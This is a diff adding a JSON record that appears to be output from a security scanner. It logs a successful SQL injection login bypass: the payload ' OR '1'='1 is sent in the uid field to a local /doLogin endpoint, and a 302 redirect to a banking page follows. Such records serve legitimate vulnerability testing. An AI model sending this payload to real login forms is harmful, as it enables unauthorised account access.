@@ -1,0 +1,29 @@
+{
+  "finding_index": 1,
+  "sink": "uid",
+  "payload": "' OR '1'='1",
+  "request": {
+    "url": "http://example.local/doLogin",
+    "method": "POST",
+    "headers": {},
+    "data": {
+      "uid": "' OR '1'='1",
+      "passw": "",
+      "btnSubmit": "Login"
+    },
+    "json": null
+  },
+  "result": {
+    "ok": true,
+    "status_code": 302,
+    "reason": "Found",
+    "headers": {
+      "Server": "BaseHTTP/0.6 Python/3.11.14",
+      "Date": "Sun, 09 Nov 2025 16:57:49 GMT",
+      "Location": "/bank/main.jsp",
+      "Content-Type": "text/html"
+    },
+    "elapsed_seconds": 0.040541,
+    "body_text": ""
+  }
+}
